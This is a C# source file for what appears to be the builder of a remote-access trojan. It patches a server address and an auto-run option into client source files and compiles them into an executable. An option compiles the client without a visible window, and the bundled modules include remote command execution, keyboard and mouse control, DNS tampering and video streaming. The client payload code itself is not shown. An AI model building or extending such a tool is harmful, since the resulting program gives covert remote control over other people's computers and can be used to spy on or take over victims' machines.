using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.IO;
using System.Net;
using networkWork.view;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.Text.RegularExpressions;

namespace networkWork.model
{
    public static class clientCompiler
    {
        public static string mainFolder = "Client";
        public static string taskFolder = "task";
        public static string threadSocketFolder = "threadSocket";

        public static string program = $@"{mainFolder}/Program.cs";
        public static string GO = $@"{mainFolder}/GO.cs";
        public static string baseTask = $@"{mainFolder}/{taskFolder}/baseTask.cs";
        public static string cmdTask = $@"{mainFolder}/{taskFolder}/cmdTask.cs";
        public static string keyBoardTask = $@"{mainFolder}/{taskFolder}/keyBoardTask.cs";
        public static string mouseTask = $@"{mainFolder}/{taskFolder}/mouseTask.cs";
        public static string removeDNS = $@"{mainFolder}/{taskFolder}/removeDNS.cs";
        public static string startMessage = $@"{mainFolder}/{taskFolder}/startMessage.cs";

        public static string baseThreadSocket = $@"{mainFolder}/{threadSocketFolder}/baseThreadSocket.cs";
        public static string taskSocket = $@"{mainFolder}/{threadSocketFolder}/taskSocket.cs";
        public static string videoSocket = $@"{mainFolder}/{threadSocketFolder}/videoSocket.cs";

        public static void compile(compileMode mode, string server, bool autoRun, bool invise, string path)
        {
            if (mode == compileMode.staticIP && !IPAddress.TryParse(server, out var ip))
                throw new Exception("Invalid ip");

            string[] code = getCode(mode, server, autoRun);

            runCompile(code, invise, path);
        }

        private static string[] getCode(compileMode mode, string server, bool autoRun)
        {
            List<string> h = new List<string>();
            string program = File.ReadAllText(clientCompiler.program);
            string GO = File.ReadAllText(clientCompiler.GO);

            program = new Regex("<server>(.*)</server>").Replace(program, mode == compileMode.dynamicIP ? "GO.parceIP(GO.getDomain())" : "\"" + server + "\"");
            GO = new Regex("<domain>(.*)</domain>").Replace(GO, mode == compileMode.dynamicIP ? "\"" + server + "\"" : "\"\"");
            program = new Regex("<autoRun>(.*)</autoRun>").Replace(program, autoRun ? "setAutoRun();" : "");

            h.Add(program);
            h.Add(GO);
            //можно в цикле используя рефлексию
            h.Add(File.ReadAllText(clientCompiler.baseTask));
            h.Add(File.ReadAllText(clientCompiler.cmdTask));
            h.Add(File.ReadAllText(clientCompiler.keyBoardTask));
            h.Add(File.ReadAllText(clientCompiler.mouseTask));
            h.Add(File.ReadAllText(clientCompiler.removeDNS));
            h.Add(File.ReadAllText(clientCompiler.startMessage));
            h.Add(File.ReadAllText(clientCompiler.baseThreadSocket));
            h.Add(File.ReadAllText(clientCompiler.taskSocket));
            h.Add(File.ReadAllText(clientCompiler.videoSocket));

            return h.ToArray();
        }

        private static void runCompile(string[] code, bool invise, string path)
        {
            CompilerParameters compilerParams = new CompilerParameters
            {
                OutputAssembly = path,
                GenerateExecutable = true
            };
            compilerParams.ReferencedAssemblies.Add("System.dll");
            compilerParams.ReferencedAssemblies.Add("System.Net.dll");
            compilerParams.ReferencedAssemblies.Add("System.Linq.dll");
            compilerParams.ReferencedAssemblies.Add("System.Drawing.dll");
            compilerParams.ReferencedAssemblies.Add("System.Net.Sockets.dll");
            compilerParams.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            compilerParams.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");

            if (invise)
                compilerParams.CompilerOptions = "/target:winexe";

            CompilerResults results = CodeDomProvider.CreateProvider("CSharp").CompileAssemblyFromSource(compilerParams, code);

            //CompilerResults results = new CSharpCodeProvider().CreateCompiler().CompileAssemblyFromSourceBatch(compilerParams, code);

            foreach (CompilerError err in results.Errors)
            {
                Console.WriteLine("ERROR {0}", err.ErrorText);
            }

            if (results.Errors.HasErrors)
                throw new Exception("Compilation error");
        }
    }
}
